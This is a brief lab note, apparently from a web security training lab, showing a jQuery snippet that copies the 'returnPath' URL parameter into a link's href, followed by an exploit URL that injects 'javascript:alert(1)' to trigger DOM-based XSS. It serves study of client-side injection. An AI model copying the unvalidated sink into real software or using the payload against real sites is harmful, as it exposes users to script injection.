<script>
    $(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>

Exploit: https://acfe1f7a1f3db20f807e359b004a00a6.web-security-academy.net/feedback?returnPath=javascript:alert(1)
